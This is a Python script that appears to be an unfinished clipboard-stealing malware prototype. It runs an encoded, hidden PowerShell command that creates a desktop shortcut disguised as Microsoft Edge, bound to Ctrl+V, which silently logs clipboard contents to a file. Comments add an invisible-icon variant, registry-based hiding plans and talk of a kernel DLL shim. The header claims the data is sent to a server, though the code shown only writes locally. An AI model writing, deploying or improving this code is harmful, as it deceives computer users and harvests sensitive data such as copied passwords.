# runs powershell to create a shortcut on User's desktop
# disguised as Microsoft Edge
# activated with copy/paste
# grabs clipboard content and sends to server

from subprocess import check_output

# basic command: $WShell = New-Object -comObject WScript.Shell; $Shortcut = $WShell.CreateShortcut("$env:USERPROFILE\Desktop\Microsoft Edge.lnk"); $Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"; $Shortcut.IconLocation = "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe,IDR_MAINFRAME"; $Shortcut.hotkey = "ctrl+v"; $Shortcut.Arguments = "-WindowStyle Hidden Get-Clipboard | Add-Content -Path $env:USERPROFILE\Desktop\thing.txt; $keys = Get-Clipboard; Start-Sleep 1; [System.Windows.Forms.SendKeys]::SendWait($keys)"; $Shortcut.WindowStyle = 7; $Shortcut.Save();
# encoded: JABXAFMAaABlAGwAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBjAG8AbQBPAGIAagBlAGMAdAAgAFcAUwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAOwAgACQAUwBoAG8AcgB0AGMAdQB0ACAAPQAgACQAVwBTAGgAZQBsAGwALgBDAHIAZQBhAHQAZQBTAGgAbwByAHQAYwB1AHQAKAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwATQBpAGMAcgBvAHMAbwBmAHQAIABFAGQAZwBlAC4AbABuAGsAIgApADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAFQAYQByAGcAZQB0AFAAYQB0AGgAIAA9ACAAIgAlAFMAeQBzAHQAZQBtAFIAbwBvAHQAJQBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBJAGMAbwBuAEwAbwBjAGEAdABpAG8AbgAgAD0AIAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0AIABGAGkAbABlAHMAIAAoAHgAOAA2ACkAXABNAGkAYwByAG8AcwBvAGYAdABcAEUAZABnAGUAXABBAHAAcABsAGkAYwBhAHQAaQBvAG4AXABtAHMAZQBkAGcAZQAuAGUAeABlACwASQBEAFIAXwBNAEEASQBOAEYAUgBBAE0ARQAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAGgAbwB0AGsAZQB5ACAAPQAgACIAYwB0AHIAbAArAHYAIgA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBBAHIAZwB1AG0AZQBuAHQAcwAgAD0AIAAiAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIABHAGUAdAAtAEMAbABpAHAAYgBvAGEAcgBkACAAfAAgAEEAZABkAC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwAdABoAGkAbgBnAC4AdAB4AHQAOwAgACQAawBlAHkAcwAgAD0AIABHAGUAdAAtAEMAbABpAHAAYgBvAGEAcgBkADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAxADsAIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAFMAZQBuAGQASwBlAHkAcwBdADoAOgBTAGUAbgBkAFcAYQBpAHQAKAAkAGsAZQB5AHMAKQAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAD0AIAA3ADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAFMAYQB2AGUAKAApADsA

# other version for future testing
# invisible icon
# combine with HKCU reg changes for invisibility
# basic command: $WShell = New-Object -comObject WScript.Shell; $Shortcut = $WShell.CreateShortcut("$env:USERPROFILE\Desktop\ .lnk"); $Shortcut.TargetPath = "%SystemRoot%\system32\WindowsPowerShell\v1.0\powershell.exe"; $Shortcut.IconLocation = "%SystemRoot%\System32\Shell32.dll,50"; $Shortcut.hotkey = "ctrl+y"; $Shortcut.Arguments = "-WindowStyle Hidden Get-Clipboard | Add-Content -Path $env:USERPROFILE\Desktop\thing.txt"; $Shortcut.WindowStyle = 7; $Shortcut.Save();
# encoded: JABXAFMAaABlAGwAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBjAG8AbQBPAGIAagBlAGMAdAAgAFcAUwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAOwAgACQAUwBoAG8AcgB0AGMAdQB0ACAAPQAgACQAVwBTAGgAZQBsAGwALgBDAHIAZQBhAHQAZQBTAGgAbwByAHQAYwB1AHQAKAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwAIAAuAGwAbgBrACIAKQA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBUAGEAcgBnAGUAdABQAGEAdABoACAAPQAgACIAJQBTAHkAcwB0AGUAbQBSAG8AbwB0ACUAXABzAHkAcwB0AGUAbQAzADIAXABXAGkAbgBkAG8AdwBzAFAAbwB3AGUAcgBTAGgAZQBsAGwAXAB2ADEALgAwAFwAcABvAHcAZQByAHMAaABlAGwAbAAuAGUAeABlACIAOwAgACQAUwBoAG8AcgB0AGMAdQB0AC4ASQBjAG8AbgBMAG8AYwBhAHQAaQBvAG4AIAA9ACAAIgAlAFMAeQBzAHQAZQBtAFIAbwBvAHQAJQBcAFMAeQBzAHQAZQBtADMAMgBcAFMAaABlAGwAbAAzADIALgBkAGwAbAAsADUAMAAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAGgAbwB0AGsAZQB5ACAAPQAgACIAYwB0AHIAbAArAHkAIgA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBBAHIAZwB1AG0AZQBuAHQAcwAgAD0AIAAiAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIABHAGUAdAAtAEMAbABpAHAAYgBvAGEAcgBkACAAfAAgAEEAZABkAC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwAdABoAGkAbgBnAC4AdAB4AHQAIgA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBXAGkAbgBkAG8AdwBTAHQAeQBsAGUAIAA9ACAANwA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBTAGEAdgBlACgAKQA7AA==

# this is far from done
# current problems: shortcut overrides actual function i.e. copy shortcut does not work
# potential solutions: write dll & shim into kernel || write keys from clipboard contents & deal with focused window issues

def main():
    check_output('powershell "-WindowStyle Hidden -encoded JABXAFMAaABlAGwAbAAgAD0AIABOAGUAdwAtAE8AYgBqAGUAYwB0ACAALQBjAG8AbQBPAGIAagBlAGMAdAAgAFcAUwBjAHIAaQBwAHQALgBTAGgAZQBsAGwAOwAgACQAUwBoAG8AcgB0AGMAdQB0ACAAPQAgACQAVwBTAGgAZQBsAGwALgBDAHIAZQBhAHQAZQBTAGgAbwByAHQAYwB1AHQAKAAiACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwATQBpAGMAcgBvAHMAbwBmAHQAIABFAGQAZwBlAC4AbABuAGsAIgApADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAFQAYQByAGcAZQB0AFAAYQB0AGgAIAA9ACAAIgAlAFMAeQBzAHQAZQBtAFIAbwBvAHQAJQBcAHMAeQBzAHQAZQBtADMAMgBcAFcAaQBuAGQAbwB3AHMAUABvAHcAZQByAFMAaABlAGwAbABcAHYAMQAuADAAXABwAG8AdwBlAHIAcwBoAGUAbABsAC4AZQB4AGUAIgA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBJAGMAbwBuAEwAbwBjAGEAdABpAG8AbgAgAD0AIAAiAEMAOgBcAFAAcgBvAGcAcgBhAG0AIABGAGkAbABlAHMAIAAoAHgAOAA2ACkAXABNAGkAYwByAG8AcwBvAGYAdABcAEUAZABnAGUAXABBAHAAcABsAGkAYwBhAHQAaQBvAG4AXABtAHMAZQBkAGcAZQAuAGUAeABlACwASQBEAFIAXwBNAEEASQBOAEYAUgBBAE0ARQAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAGgAbwB0AGsAZQB5ACAAPQAgACIAYwB0AHIAbAArAHYAIgA7ACAAJABTAGgAbwByAHQAYwB1AHQALgBBAHIAZwB1AG0AZQBuAHQAcwAgAD0AIAAiAC0AVwBpAG4AZABvAHcAUwB0AHkAbABlACAASABpAGQAZABlAG4AIABHAGUAdAAtAEMAbABpAHAAYgBvAGEAcgBkACAAfAAgAEEAZABkAC0AQwBvAG4AdABlAG4AdAAgAC0AUABhAHQAaAAgACQAZQBuAHYAOgBVAFMARQBSAFAAUgBPAEYASQBMAEUAXABEAGUAcwBrAHQAbwBwAFwAdABoAGkAbgBnAC4AdAB4AHQAOwAgACQAawBlAHkAcwAgAD0AIABHAGUAdAAtAEMAbABpAHAAYgBvAGEAcgBkADsAIABTAHQAYQByAHQALQBTAGwAZQBlAHAAIAAxADsAIABbAFMAeQBzAHQAZQBtAC4AVwBpAG4AZABvAHcAcwAuAEYAbwByAG0AcwAuAFMAZQBuAGQASwBlAHkAcwBdADoAOgBTAGUAbgBkAFcAYQBpAHQAKAAkAGsAZQB5AHMAKQAiADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAFcAaQBuAGQAbwB3AFMAdAB5AGwAZQAgAD0AIAA3ADsAIAAkAFMAaABvAHIAdABjAHUAdAAuAFMAYQB2AGUAKAApADsA"')
    pass


if __name__ == '__main__':
    main()
